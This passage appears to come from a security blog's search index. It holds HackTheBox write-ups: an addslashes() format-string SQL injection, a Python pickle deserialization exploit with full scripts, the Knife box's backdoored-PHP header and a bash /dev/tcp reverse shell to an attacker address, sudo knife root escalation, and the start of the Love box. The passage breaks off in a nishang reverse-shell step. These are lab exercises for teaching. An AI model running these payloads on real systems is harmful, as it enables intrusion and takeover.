Checking whether sources has changed... I: Checking whether resources has changed... I: Building resources... I: Building apk file... I: Copying unknown files/dir... I: Built apk...  $ keytool -genkey -v -keystore key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias HTB-alias Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true Enter keystore password: Re-enter new password: What is your first and last name?   [Unknown]: What is the name of your organizational unit?   [Unknown]: What is the name of your organization?   [Unknown]: What is the name of your City or Locality?   [Unknown]: What is the name of your State or Province?   [Unknown]: What is the two-letter country code for this unit?   [Unknown]: Is CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown correct?   [no]:  yes  Generating 2,048 bit RSA key pair and self-signed certificate (SHA256withRSA) with a validity of 10,000 days         for: CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown [Storing key.jks]  $ jarsigner -keystore key.jks APKrypt.apk HTB-alias Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true Enter Passphrase for keystore: jar signed.  Warning: The signer certificate is self-signed.  $ sudo cp APKrypt.apk /mnt/hgfs/VM-Shared/HTB/APKrypt-patched.apk"
  },
  
  {
    "title": "The 5 BEST platforms to practice Ethical Hacking in 2022",
    "url": "/posts/best-websites-to-practice-hacking/",
    "categories": "Articles & Writeups, InfoSec Education",
    "tags": "hacking-lab",
    "date": "2022-02-25 00:00:00 +0100",
    "content": "Introduction This video shows what I consider to be the best platforms to learn offensive cybersecurity and practice your ethical hacking and penetration testing skills in 2022.  Video   References List of sites mentioned within the video:    PWNX: https://pwnx.io/   Port Swigger Web Academy: https://portswigger.net/web-security   VulnHub: https://www.vulnhub.com/   Offensive Security Proving Grounds: https://www.offensive-security.com/labs/individual/   HackTheBox: https://www.hackthebox.com/   HTB Academy: https://academy.hackthebox.com/   TryHackMe: https://tryhackme.com/   Exploit Education: https://exploit.education/   Pwn.college: https://pwn.college/"
  },
  
  {
    "title": "Bypassing addslashes() using format string to get SQL Injection",
    "url": "/posts/bypassing-addslashes-using-format-string-to-get-sql-injection/",
    "categories": "Articles & Writeups, Web Hacking",
    "tags": "hackthebox, PHP, sql-injection",
    "date": "2021-09-28 00:00:00 +0200",
    "content": "Introduction Learn how to bypass the addslashes() function using format strings and get SQL Injection in this HackTheBox challange called baby sql.  Improved skills    SQL Injection attacks   Format string vulnerabilities exploitation (vsprintf())   Bypassing security functions (addslashes())   Video   Writeup [TL;DR]    I heard that addslashes() functions protect you from malicious user input inside SQL statements. I hope you can‚Äôt prove me wrong‚Ä¶   Information Gathering The challenge starts showing us just this simple PHP code that accepts a POST parameter, sanitizes it and then tries to perform a SQL query.  &lt;?php require 'config.php';  class db extends Connection {     public function query($sql) {         $args = func_get_args();         unset($args[0]);         return parent::query(vsprintf($sql, $args));     } }  $db = new db();  if (isset($_POST['pass'])) {     $pass = addslashes($_POST['pass']);     $db-&gt;query(\"SELECT * FROM users WHERE password=('$pass') AND username=('%s')\", 'admin'); } else {     die(highlight_file(__FILE__,1)); }    This code looks secure, but is it really?  Let‚Äôs investigate the code better and try to understand what it does exactly.     First, the code requires a config file whose content is unknown to us.   Right after it defines a db class having a public function called query. The function accepts an argument, it divides it into different elements contained within the $args array, it clears the first $args element and finally returns the results of a query composed using the vsprintf() function.   Then it instantiates a $db object and checks if the pass POST parameter is set. If it‚Äôs not, it prints the current page, otherwise it takes the content of the pass parameter, sanitizes it and finally it calls the query function inserting the submitted input within the SQL query.   Ok, everything‚Äôs clear for now.  To better analyze the behaviour of the code, let‚Äôs create a local copy and add some debugging information.  &lt;?php  class db {     public function query($sql) {         echo \"query: \" . $sql . \"&lt;br&gt;\\n\";         $args = func_get_args();         echo \"Args: \" . $args[0] . \"&lt;br&gt;\\n\";         unset($args[0]);         echo \"Num Args: \" . count($args) . \"&lt;br&gt;\\n\";         echo \"Args: \" . $args[1] . \"&lt;br&gt;\\n\";         return vsprintf($sql, $args);     } }  $db = new db();  if (isset($_POST['pass'])) {     echo \"Pass: \" . $_POST['pass'] . \"&lt;br&gt;\\n\";     $pass = addslashes($_POST['pass']);     echo \"Pass after addslashes: \" . $pass . \"&lt;br&gt;\\n\";     $res = $db-&gt;query(\"SELECT * FROM users WHERE password=('$pass') AND username=('%s')\", 'admin');     echo \"Res: \" . $res . \"&lt;br&gt;\\n\"; } else {     die(highlight_file(__FILE__,1)); }    We can remove both the require instruction as well as the definition of the parent class Connection and the parent::query function because we are not interested in executing the actual query, we just want to analyze input behaviour.  For testing purposes we can fire up an easy and fast php server using the php -S IP:port command and then browsing to that specific IP and port to verify that the PHP page is correctly hosted.    Good, the page works correctly! Let‚Äôs see what happens when we send the pass parameter.    Makes sense, it is inserted within the query and used as a password. What happens if we insert a basic SQL injection payload instead?    Mmmm‚Ä¶ Interesting. Quotes are escaped after having been processed by the addslashes() function.  As mentioned within the official PHP documentation:    addslashes returns a string with backslashes added before characters that need to be escaped. These characters are:        single quote (')     double quote (\")     backslash (\\)     NUL byte        We can verify it by passing those symbols within the pass parameter.   In the current situation the limit imposed by the addslashes() function prevents us from escaping from the query and executing a sql injection, however there is still a function that is known to be vulnerable in other languages like C and C++ and that perhaps can help us break the restrictions.     vsprintf returns a formatted string. It operates as sprintf() but accepts an array of arguments. [‚Ä¶] A conversion specification follows this prototype: %[argnum$][flags][width][.precision]specifier.     Format strings are special strings containing placeholders that will be substituted with future variables and that define in which format the variable will be processed and printed. They exist in almost every programming language: in python 1, in C 2, in PHP 3, and so on.  In our case for example %s is the placeholder that will be substituted with $arg.  The Bug Looking carefully at the source code however it is possible to notice that we can control the format argument through the pass parameter because the symbols used to define conversion specification strings (% and $) are not sanitized by the addslashes() function (which considers only ' \" and \\).  Continuing to read the documentation it is possible to find a special flag that allows padding the result with arbitrary characters.    Since our input has already been sanitized when it is processed by the vsprintf() function, we can inject any arbitrary character and basically evade the query!    Exploitation Ok, now we can carry out our sql injection attack against the real target without big problems. Let‚Äôs fire up Burpsuite and discover which kind of SQL Injection attacks we can perform.  Basic UNION queries seem useless because results are not shown within the server response.    Time-based attacks might work, the server replies after the desired time so it may be possible to enumerate db data using timing.    However the fastest technique is to execute arbitrary queries and exfiltrate the results using error messages since the server replies with verbose errors.    Oh, we also already got the name of the DB currently in use, cool!  First let‚Äôs extract all the tables from the database. Let‚Äôs use the extractvalue() and concat() to execute the query and extract its results within the errors.    Subquery returns more than 1 row  That‚Äôs right, when using error-based SQL injection results must be returned in one single row, while the query we have performed returns a row for every table found. Let‚Äôs fix this by grouping and concatenating all the results within a single one.    Shish, there are too many tables and the output is cut off. Let‚Äôs try to introduce a WHERE statement to filter out undesired results.  Because we don‚Äôt want to deal with other quotes or double-quotes, we can use the hexadecimal representation to specify filters. In this way we can extract only the tables contained within the desired database.    Nice, totally_not_a_flag sounds very interesting, let‚Äôs enumerate its columns in the same way as before.    Mmmm‚Ä¶ A single column named Flag: it sounds even more interesting this time.  Let‚Äôs see what‚Äôs contained inside this table:    This time addslashes() doesn‚Äôt protect you from malicious user input I guess.                 https://docs.python.org/3/tutorial/inputoutput.html#tut-f-strings¬†&#8617;&#xfe0e;                 https://devdocs.io/c/io/fprintf¬†&#8617;&#xfe0e;                 https://www.php.net/manual/en/function.fprintf.php¬†&#8617;&#xfe0e;"
  },
  
  {
    "title": "Pickle Insecure Deserialization",
    "url": "/posts/pickle-insecure-deserialization/",
    "categories": "Articles & Writeups, Web Hacking",
    "tags": "hackthebox, python, deserialization",
    "date": "2021-09-01 00:00:00 +0200",
    "content": "Introduction Walkthrough for the baby website rick web challenge from HackTheBox.   Improved skills    How serialization and deserialization work   How to exploit insecure deserialization vulnerabilities when using python pickle.   Video   Writeup [TL;DR]    Look Morty, look! I turned myself into a website Morty, I‚Äôm Website Rick babyyy!! But don‚Äôt play around with some of them anti pickle serum I have stored somewhere safe, if I turn back to a human I‚Äôll have to go to family therapy and we don‚Äôt want that Morty.   Information Gathering  Running the instance of the challenge it is possible to browse to the Website Rick home page, where it is possible to read:   Don‚Äôt play around with this serum morty!! and then the info &lt;__main__.anti_pickle_serum object at 0x7f88f526cf90&gt;  As also suggested by the title of the page, this challenge focuses on an insecure deserialization vulnerability.  Intercepting with Burpsuite the request sent to the server, it is possible to notice that the client sends a strange cookie, called plan_b. Decoding the cookie I can read some weird instruction like __main__ or __builtin__ object that suggest me something related to python, as also confirmed by the Server Fingerprint.    At the moment I can already assume that playing around with the cookie probably will lead to some kind of code execution or file inclusion, however I don‚Äôt know yet in what way.  Because the word pickle appears multiple times, I started documenting about what it is, discovering that pickle is a Python module used to serialize and deserialize objects. As also said within the official documentation, pickle is not secure. It is possible to construct malicious pickle data which will execute arbitrary code during unpickling. Ok, so plan_b is a cookie used to pass pickled serialized data to the server.    From what I just read from the documentation it is possible to send a malicious cookie in order to force the server to deserialize it and execute arbitrary code. But in which way?  The documentation shows different methods that can be used to manage pickle data, as well as another module, called pickletools, that can be used to disassemble pickled object. In order to better understand what is passed to the server, I wrote a small python script that decompile and optimize the plan_b cookie. The decompiled pickle is not very helpful, however it allows to understand that the server is expecting an anti_pickle_serum class object (as also suggested by the home page).    Ok, I‚Äôve no idea on what to do next, so let‚Äôs search online for any good article explaining this pickle vulnerability.  The Bug One of the first results is this blog post from David‚Äôs personal site 1 where it explains how to exploit a pickle deserialization vulnerability using the __reduce__() function.  The __reduce__() method takes no argument and shall return either a string or a tuple. The semantics of each item are in order:    A callable object that will be called to create the initial version of the object.   A tuple of arguments for the callable object. An empty tuple must be given if the callable does not accept any argument.   So by implementing __reduce__() in a class, I can give the pickling process a callable and some other arguments to run. Potentially I can execute os.system() and some commands, as also shown by the David‚Äôs PoC.  Based on its code I wrote a test exploit which implement the __reduce__() method and execute ls. I gave to the class the same name used by the original pickle and I generated the serialized string.  Mmm‚Ä¶ Looking at the decompiled code it seems too different from the previous one, however let‚Äôs see if the exploit work. Let me copy the string and paste it within the plan_b cookie‚Ä¶ Crap, Internal Server Error. Probably the two objects differs too much.  After some trial and error I figured out how to generate almost the same serialized object. The script simply defines a void constructor and then generates the corresponding pickle. The two however are still different.    Exploitation Looking at the meaning of the decompiled SETITEM opcode I found out that it add a pair of Key-Value to an existing dictionary, meaning that my custom object must be pickled inside a dictionary in order to be equal the original one. Good! The two object are now the same, I have successfully reversed the original pickle and I‚Äôm able to generate valid serialized objects. Let‚Äôs try to implement the __reduce__() method within this class and see if it works now that the result is the same of the original.  It works! Although it didn‚Äôt show the result of the executed command, the server did not throw an Internal Server Error, instead it printed a ‚Äú0‚Äù which is the value returned by the command.    As said by this user on StackExchange ‚Äúos.system() just run the process, it doesn‚Äôt capture the output‚Äù. In order to obtain the output of the command it is necessary to use a different function, like subprocess.check_output()  Ok, let‚Äôs implement the new function.  Damn, it is better if I re-read the documentation‚Ä¶ Right, I must return a tuple containing the function to call and a tuple of arguments. Maybe we are done.  #!/usr/bin/env python import pickle import pickletools import base64 import os import subprocess  class anti_pickle_serum(object): \tdef __reduce__(self): \t\tcmd = ['ls'] \t\treturn subprocess.check_output, (cmd,)  exploit_obj = anti_pickle_serum() raw_pickle = pickle.dumps({\"serum\" : exploit_obj}, protocol=0)  optimed_pickle = pickletools.optimize(raw_pickle) pickletools.dis(optimed_pickle)  payload = base64.b64encode(raw_pickle) print(payload)   Wait, this should be correct! Maybe python3 and python2 behave differently when generating the serialized object? The server uses python2 so let‚Äôs try with that version.  Here we go! I have successfully executed the ls command. Now let‚Äôs update the script and obtain the flag!  #!/usr/bin/env python import pickle import pickletools import base64 import os import subprocess  class anti_pickle_serum(object): \tdef __reduce__(self): \t\tcmd = ['cat', 'flag_wIp1b'] \t\treturn subprocess.check_output, (cmd,)  exploit_obj = anti_pickle_serum() raw_pickle = pickle.dumps({\"serum\" : exploit_obj}, protocol=0)  optimed_pickle = pickletools.optimize(raw_pickle) pickletools.dis(optimed_pickle)  payload = base64.b64encode(raw_pickle) print(payload)                 https://davidhamann.de/2020/04/05/exploiting-python-pickle/¬†&#8617;&#xfe0e;"
  },
  
  {
    "title": "HackTheBox - Knife",
    "url": "/posts/knife/",
    "categories": "Articles & Writeups, HackTheBox",
    "tags": "hackthebox",
    "date": "2021-08-28 00:00:00 +0200",
    "content": "Introduction Knife is a Easy difficulty Linux box from HackTheBox based on the exploitation of a backdoored PHP version. After having identified the backdoor by inspecting the source code on GitHub it is possible to obtain code execution and obtain an access as   james. The user is allowed to run knife with high privileges. Since knife allows to edit files using vi and it does not drop privileges, it is possible to leverage this issue and escalate to root spawning an interactive shell from within vi.  Improved skills    Exploiting a backdoored PHP version (8.1.0-dev)   knife (vi) privilege escalation   Used tools    nmap   Video     Enumeration Scanned all TCP ports: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Knife] ‚îî‚îÄ$ sudo nmap -sS -p- 10.10.10.242 -Pn -v -oN scans/all-tcp-ports.txt ... PORT   STATE SERVICE 22/tcp open  ssh 80/tcp open  http   Enumerated open TCP ports: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Knife] ‚îî‚îÄ$ sudo nmap -sV -sC -sT -p80,22 10.10.10.242 -Pn -v -oN scans/open-tcp-ports.txt ... PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA) |   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA) |_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519) 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_  Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title:  Emergent Medical Idea Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   Browsed port 80:   Enumerated web components:      PHP 8.1.0   Apache 2.4.41   After some time invested in enumeration without identifying criticality, I start documenting myself about this ‚Äústrange‚Äù version of PHP which I had never encountered before, discovering that it had been ‚Äúbackdoored‚Äù while under development.    Commit 1   Commit 2   Foothold The code injected within PHP 8.1.0-dev executes arbitrary code from the USER_AGENTT header when it starts with zerodium: ... { \tzval zoh; \tphp_output_handler *h; \tzval *enc;  \tif ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || zend_is_auto_global_str(ZEND_STRL(\"_SERVER\"))) &amp;&amp; \t\t(enc = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), \"HTTP_USER_AGENTT\", sizeof(\"HTTP_USER_AGENTT\") - 1))) { \t\tconvert_to_string(enc); \t\tif (strstr(Z_STRVAL_P(enc), \"zerodium\")) { \t\t\tzend_try { \t\t\t\tzend_eval_string(Z_STRVAL_P(enc)+8, NULL, \"REMOVETHIS: sold to zerodium, mid 2017\"); \t\t\t} zend_end_try(); \t\t} \t} ...   It is possible to verify the backdoor by trying to ping back our machine using User-Agentt: zerodium system('ping -c1 10.10.14.17');: POST /index.php HTTP/1.1 Host: 10.10.10.242 User-Agentt: zerodium system('ping -c1 10.10.14.17'); Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/\\*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Content-Length: 0   and thus obtaining a ping back: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Knife/scans] ‚îî‚îÄ$ sudo tcpdump -i tun0 icmp [sudo] password for kali: tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes 18:01:03.012545 IP knife.htb &gt; 10.10.14.17: ICMP echo request, id 1, seq 1, length 64 18:01:03.012577 IP 10.10.14.17 &gt; knife.htb: ICMP echo reply, id 1, seq 1, length 64   At this point it is possible to execute a classic reverse shell payload and obtain a low level access to the machine: POST /index.php HTTP/1.1 Host: 10.10.10.242 User-Agentt: zerodium system(\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.17/10099 0&gt;&amp;1'\"); Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Content-Length: 0  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Knife/scans] ‚îî‚îÄ$ nc -nlvp 10099 listening on [any] 10099 ... connect to [10.10.14.17] from (UNKNOWN) [10.10.10.242] 60114 bash: cannot set terminal process group (1036): Inappropriate ioctl for device bash: no job control in this shell james@knife:/$ whoami whoami james james@knife:/$ hostname &amp;&amp; ifconfig hostname &amp;&amp; ifconfig knife ens160: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500         inet 10.10.10.242  netmask 255.255.255.0  broadcast 10.10.10.255         inet6 dead:beef::250:56ff:feb9:befe  prefixlen 64  scopeid 0x0&lt;global&gt;         inet6 fe80::250:56ff:feb9:befe  prefixlen 64  scopeid 0x20&lt;link&gt;         ether 00:50:56:b9:be:fe  txqueuelen 1000  (Ethernet)         RX packets 2717765  bytes 412004448 (412.0 MB)         RX errors 0  dropped 47  overruns 0  frame 0         TX packets 2505289  bytes 1104331428 (1.1 GB)         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0  lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536         inet 127.0.0.1  netmask 255.0.0.0         inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;         loop  txqueuelen 1000  (Local Loopback)         RX packets 10879268  bytes 1934361744 (1.9 GB)         RX errors 0  dropped 0  overruns 0  frame 0         TX packets 10879268  bytes 1934361744 (1.9 GB)         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0  which python3 /usr/bin/python3 james@knife:/$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")' python3 -c 'import pty;pty.spawn(\"/bin/bash\")' james@knife:/$ ^Z zsh: suspended  nc -nlvp 10099  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Knife/scans] ‚îî‚îÄ$ stty raw -echo; fg\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t148 ‚®Ø 1 ‚öô [1]  + continued  nc -nlvp 10099 james@knife:/$ export TERM=xterm james@knife:/$ stty rows 60 columns 235   Privilege Escalation Enumerated sudo capabilities: james@knife:~$ sudo -l Matching Defaults entries for james on knife:     env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  User james may run the following commands on knife:     (root) NOPASSWD: /usr/bin/knife   Knife allowed to choose a file to edit and the editor to use. Because the program did not drop privileges, it was possible to use the vi editor and then escape it by spawning a privileged shell: james@knife:/opt$ sudo /usr/bin/knife client edit healthcare-validator -e vi    root@knife:/opt# id &amp;&amp; hostname &amp;&amp; cat /root/root.txt &amp;&amp; ifconfig uid=0(root) gid=0(root) groups=0(root) knife 6ae0ca51... ens160: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500         inet 10.10.10.242  netmask 255.255.255.0  broadcast 10.10.10.255         inet6 dead:beef::250:56ff:feb9:befe  prefixlen 64  scopeid 0x0&lt;global&gt;         inet6 fe80::250:56ff:feb9:befe  prefixlen 64  scopeid 0x20&lt;link&gt;         ether 00:50:56:b9:be:fe  txqueuelen 1000  (Ethernet)         RX packets 2722013  bytes 412311064 (412.3 MB)         RX errors 0  dropped 66  overruns 0  frame 0         TX packets 2509092  bytes 1106488505 (1.1 GB)         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0  lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536         inet 127.0.0.1  netmask 255.0.0.0         inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;         loop  txqueuelen 1000  (Local Loopback)         RX packets 10923171  bytes 1938581473 (1.9 GB)         RX errors 0  dropped 0  overruns 0  frame 0         TX packets 10923171  bytes 1938581473 (1.9 GB)         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0     Knife however also allows to execute raw ruby code using the exec parameter, allowing to execute arbitrary code with high privileges: james@knife:/opt$ sudo /usr/bin/knife exec -E \"exec '/bin/bash'\" root@knife:/opt# id &amp;&amp; hostname &amp;&amp; cat /root/root.txt &amp;&amp; ifconfig uid=0(root) gid=0(root) groups=0(root) knife 6ae0ca51... ens160: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500         inet 10.10.10.242  netmask 255.255.255.0  broadcast 10.10.10.255         inet6 dead:beef::250:56ff:feb9:befe  prefixlen 64  scopeid 0x0&lt;global&gt;         inet6 fe80::250:56ff:feb9:befe  prefixlen 64  scopeid 0x20&lt;link&gt;         ether 00:50:56:b9:be:fe  txqueuelen 1000  (Ethernet)         RX packets 2722013  bytes 412311064 (412.3 MB)         RX errors 0  dropped 66  overruns 0  frame 0         TX packets 2509092  bytes 1106488505 (1.1 GB)         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0  lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536         inet 127.0.0.1  netmask 255.0.0.0         inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;         loop  txqueuelen 1000  (Local Loopback)         RX packets 10923171  bytes 1938581473 (1.9 GB)         RX errors 0  dropped 0  overruns 0  frame 0         TX packets 10923171  bytes 1938581473 (1.9 GB)         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0   Trophy A knife is as good as the one who wields it - Patrick Ness"
  },
  
  {
    "title": "HackTheBox - Love",
    "url": "/posts/love/",
    "categories": "Articles & Writeups, HackTheBox",
    "tags": "hackthebox",
    "date": "2021-08-07 00:00:00 +0200",
    "content": "Introduction Love is a Easy difficulty Windows machine that hosts two web servers. One of them replies with a Forbidden error, however disclosing an internal staging sub-domain, while the other one is vulnerable to SSRF and allows to enumerate the first. Exploitation of the SSRF permit to obtain valid credentials in order to access a restricted area vulnerable to Arbitrary File Upload and thus to Remote Code Execution. Once obtained a reverse shell the local enumeration of the target reveals that both the machine and the compromised user has the AlwaysInstallElevated attribute enabled, allowing to install a malicious .msi binary in order to elevate privileges to SYSTEM.  Improved skills:    Exploiting SSRF to enumerate restricted area   Exploiting Arbitrary File Upload to achieve RCE   AlwaysInstallElevated privilege escalation   Used tools:    nmap   gobuster   nishang (.ps1 reverse shell)   msfvenom   impacket (smbserver)     Enumeration Scanned all TCP ports:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Love] ‚îî‚îÄ$ sudo nmap -p- 10.129.128.110 -sS -Pn -oN scans/all-tcp-ports.txt -v ... PORT      STATE SERVICE 80/tcp    open  http 135/tcp   open  msrpc 139/tcp   open  netbios-ssn 443/tcp   open  https 445/tcp   open  microsoft-ds 3306/tcp  open  mysql 5000/tcp  open  upnp 5040/tcp  open  unknown 5985/tcp  open  wsman 5986/tcp  open  wsmans 47001/tcp open  winrm 49664/tcp open  unknown 49665/tcp open  unknown 49666/tcp open  unknown 49667/tcp open  unknown 49668/tcp open  unknown 49669/tcp open  unknown 49670/tcp open  unknown   Enumerated all TCP open ports:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Love] ‚îî‚îÄ$ sudo nmap -sV -sT -sC -p 80,135,139,443,445,3306,5000,5040,5985,5986,47001,49664,49665,49666,49667,49668,49669,49670 -oN scans/open-tcp-ports.txt 10.129.128.110 -Pn ... PORT      STATE SERVICE      VERSION 80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27) | http-cookie-flags: |   /: |     PHPSESSID: |_      httponly flag not set |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 |_http-title: Voting System using PHP 135/tcp   open  msrpc        Microsoft Windows RPC 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn 443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27) |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 |_http-title: 403 Forbidden | ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in | Not valid before: 2021-01-18T14:00:16 |_Not valid after:  2022-01-18T14:00:16 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_  http/1.1 445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP) 3306/tcp  open  mysql? | fingerprint-strings: |   NULL: |_    Host '10.10.14.105' is not allowed to connect to this MariaDB server 5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27) |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 |_http-title: 403 Forbidden 5040/tcp  open  unknown 5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found | ssl-cert: Subject: commonName=LOVE | Subject Alternative Name: DNS:LOVE, DNS:Love | Not valid before: 2021-04-11T14:39:19 |_Not valid after:  2024-04-10T14:39:19 |_ssl-date: 2021-05-05T14:20:03+00:00; +21m33s from scanner time. | tls-alpn: |_  http/1.1 47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open  msrpc        Microsoft Windows RPC 49665/tcp open  msrpc        Microsoft Windows RPC 49666/tcp open  msrpc        Microsoft Windows RPC 49667/tcp open  msrpc        Microsoft Windows RPC 49668/tcp open  msrpc        Microsoft Windows RPC 49669/tcp open  msrpc        Microsoft Windows RPC 49670/tcp open  msrpc        Microsoft Windows RPC ...  Host script results: |_clock-skew: mean: 2h06m34s, deviation: 3h30m03s, median: 21m32s | smb-os-discovery: |   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3) |   OS CPE: cpe:/o:microsoft:windows_10::- |   Computer name: Love |   NetBIOS computer name: LOVE\\x00 |   Workgroup: WORKGROUP\\x00 |_  System time: 2021-05-05T07:19:55-07:00 | smb-security-mode: |   account_used: guest |   authentication_level: user |   challenge_response: supported |_  message_signing: disabled (dangerous, but default) | smb2-security-mode: |   2.02: |_    Message signing enabled but not required | smb2-time: |   date: 2021-05-05T14:19:50 |_  start_date: N/A   Nmap discovered a lot of open ports, as usual for windows machines. The most significant and interesting, however, are the ports 80, 443 and 5000, each of one runs an Apache web server (certificate on port 443 also disclosed an internal domain). Port 445, which is SMB, does not provide useful information other then the machine OS version, as well as MYSQL which does not accept connection outside from localhost. Ports 5986 and 47001 suggest the presence of WinRM, with which however it is not possible to do anything without having valid credentials first.  Browsed port 80:   Enumerated web directories and files: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Love] ‚îî‚îÄ$ gobuster dir -u http://10.129.128.110 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -f -r -o scans/p80-enum-dirs.txt -c 'PHPSESSID=vighiqrf6o6vn65g1qss1sr9qf' /admin/               (Status: 200) [Size: 6198]\t\t# Admin panel login /includes/            (Status: 200) [Size: 2263]\t\t# directory listing /cgi-bin/             (Status: 403) [Size: 304] /images/              (Status: 200) [Size: 1650] /plugins/             (Status: 200) [Size: 2492]\t\t# directory listing /webalizer/           (Status: 403) [Size: 304] /phpmyadmin/          (Status: 403) [Size: 304] /icons/               (Status: 200) [Size: 74798] /examples/            (Status: 503) [Size: 404]   /dist/                (Status: 200) [Size: 1391] \t\t# directory listing /tcpdf/               (Status: 200) [Size: 2712] \t\t# directory listing /licenses/            (Status: 403) [Size: 423]   /server-status/       (Status: 403) [Size: 423]   /con/                 (Status: 403) [Size: 304]   /aux/                 (Status: 403) [Size: 304] /prn/                 (Status: 403) [Size: 304]   /server-info/         (Status: 403) [Size: 423]   Browsed port 443:   Browsed port 5000:   Enumerated staging web site disclosed from the certificate on port 443: ... | ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in ...    Enumerated web files and directories: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Love] ‚îî‚îÄ$ gobuster dir -u http://staging.love.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -o scans/p80stag-enum-files.txt -k -b 403,404 ... /index.php            (Status: 200) [Size: 5357] /style.css            (Status: 200) [Size: 204030] /.                    (Status: 200) [Size: 5357]   /beta.php             (Status: 200) [Size: 4997]   /all.css              (Status: 200) [Size: 1917]    Enumerated /beta.php and discovered a Server Side Request Forgery vulnerability:   Foothold beta.php is vulnerable to SSRF and allows to enumerate internal files. Abusing this issue it is possible to reach the web server on port 5000 whose access was previously forbidden.   The web application running on port 5000 disclosed some credentials that can be used to access the admin ‚ÄòVoting System‚Äô panel on port 80:   The web application then did not validate uploaded file, allowing to upload a malicious file and obtain remote code execution:     At this point it was possible to host a powershell reverse shell from nishang ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Love/exploit] ‚îî‚îÄ$ cp /opt/post-expl/windows/nishang/Shells/Invoke-PowerShellTcp.ps1 revshell.ps1  